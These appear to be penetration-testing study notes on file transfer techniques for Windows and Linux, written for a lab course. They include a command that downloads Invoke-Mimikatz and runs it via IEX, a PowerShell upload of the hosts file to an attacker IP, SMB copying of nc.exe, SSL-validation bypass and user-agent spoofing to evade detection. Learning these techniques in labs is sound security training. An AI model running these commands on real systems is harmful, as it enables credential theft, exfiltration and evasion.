	Many data ex filtration techniques may be blocked, we need to find ways to bypass these.
## Windows File Transfers
*Fileless* means that the attack doesn't come in an external file and instead uses tools built into windows already.

![[fig1a-astaroth-attack-chain.webp]]

We can use base64 to directly copy over contents of a file if not too big.
Command line has a max character string of 8194 characters so  may not be possible.

#### Powershell Download Methods
|**Method**|**Description**|
|---|---|
|[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)|Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).|
|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Returns the data from a resource without blocking the calling thread.|
|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Downloads data from a resource and returns a Byte array.|
|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Downloads data from a resource to a local file.|
|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Downloads data from a resource to a local file without blocking the calling thread.|
|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|
|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Downloads a String from a resource without blocking the calling thread.|
Downloadstring can be piped into iex with 
```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

list of power shell download cradles can be found here 
https://gist.github.com/HarmJ0y/bb48307ffa663256e239

May need to bypass SSL with 
```powershell-session
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB Downloads
Server Message Block that runs on port 445 is common in enterprise networks where windows services are running. 

We can create a smb server with impacket's smbserver
```
impacket-smbserver
```
with this we can mount the server with a username/password
```cmd-session
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

### FTP 
We can create a ftp server with 
```
python3 -m pyftpdlib
```

and transfer files with powershell's 
```powershell-session
S C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```


### Powershell web Uploads
There is no curl command on PS it is only an alias for IEX 
```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

### WebDav
We can create our own smbserver with WebDav


## Linux
Wget and curl 

We can do fileless operations with pipes |  

Web uploads with curl and -x POST

Create self signed certs with openssl 
```shell-session
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```


## Downloading with code
#### Python
```shell-session
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

#### PHP 
```shell-session
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

#### RUBY
```shell-session
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

#### JS
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

## Miscellaneous
Encryption on linux with openssl

HTTPS/HTTP most common allowed through firewalls. python3 upload server POST

## LOTL
Lolbins  are binaries that an attacker can use to preform actions beyond their original purposes. 

Living off the Land binaries can be used to perform functions such as:

- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses

LOLBAS - Windows
https://lolbas-project.github.io/#
GTFOBINS - Linux 
https://gtfobins.github.io/

## Detection
Command line detection based off whitelists is extremely time consuming but robust.
Filter by legitimate user agent strings.

## Evading Detection
If administrators have blacklisted any user agents Invoke-WebRequest contains a useragent parameter which allows for changing the default user agent to a new one to emulate IE, Chrome, Firefox
